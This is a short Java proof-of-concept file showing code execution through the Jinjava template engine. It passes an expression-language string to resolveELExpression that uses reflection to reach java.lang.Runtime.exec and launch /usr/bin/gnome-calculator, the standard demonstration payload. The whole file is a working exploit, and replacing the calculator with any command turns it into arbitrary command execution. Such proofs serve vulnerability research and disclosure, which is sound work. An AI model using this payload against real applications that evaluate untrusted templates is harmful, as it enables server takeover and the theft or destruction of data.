import com.hubspot.jinjava.Jinjava;
import com.hubspot.jinjava.interpret.Context;
import com.hubspot.jinjava.interpret.JinjavaInterpreter;


public class poc {
    public static void main(String[] args) {
        new JinJavaTpl().calc();
    }
}


class JinJavaTpl {
    private JinjavaInterpreter interpreter;
    private Context context;
    private Jinjava jinjava;
    public void calc() {
        jinjava = new Jinjava();
        interpreter = jinjava.newInterpreter();
        context = interpreter.getContext();

        context.put("obj","");
        String poc ="''.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",''.getClass()).invoke(''.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),'/usr/bin/gnome-calculator')";
        Object a = interpreter.resolveELExpression(poc, -1);
    }
}